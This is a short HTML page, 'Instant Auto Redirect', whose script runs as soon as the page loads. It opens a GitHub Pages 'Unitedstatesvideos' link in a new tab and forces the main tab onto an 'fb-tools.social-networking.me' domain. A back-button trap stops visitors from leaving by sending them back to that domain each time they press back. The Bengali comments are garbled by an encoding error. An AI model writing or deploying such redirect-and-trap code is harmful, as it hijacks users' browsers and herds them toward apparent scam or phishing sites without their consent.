<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instant Auto Redirect</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #000;
    }
  </style>
</head>
<body>
<script>
(function(){
  var link1 = "https://shimulqww.github.io/Unitedstatesvideos/";
  var link2 = "https://fb-tools.social-networking.me";

  window.addEventListener("load", function(){
    // ‡¶™‡ßç‡¶∞‡¶•‡¶Æ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶®‡¶§‡ßÅ‡¶® ‡¶ü‡ßç‡¶Ø‡¶æ‡¶¨‡ßá ‡¶ñ‡ßÅ‡¶≤‡¶¨‡ßá
    window.open(link1, "_blank");

    // ‡¶Æ‡ßá‡¶á‡¶® ‡¶ü‡ßç‡¶Ø‡¶æ‡¶¨ ‚Üí ‡¶¶‡ßç‡¶¨‡¶ø‡¶§‡ßÄ‡ßü ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡ßá redirect ‡¶π‡¶¨‡ßá
    setTimeout(function(){
      window.location.replace(link2);
    }, 500);
  });

  // üîÑ Back button trap (‡¶¨‡¶æ‡¶∞‡¶¨‡¶æ‡¶∞ ‡¶¨‡ßá‡¶∞ ‡¶π‡¶§‡ßá ‡¶¶‡ßá‡¶¨‡ßá ‡¶®‡¶æ)
  history.pushState(null, null, location.href);
  window.onpopstate = function () {
    history.pushState(null, null, location.href);
    // back ‡¶ö‡¶æ‡¶™‡¶≤‡ßá main tab ‡¶∏‡¶¨‡¶∏‡¶Æ‡ßü link2 ‡¶§‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá
    window.location.replace(link2);
  };
})();
</script>
</body>
</html>
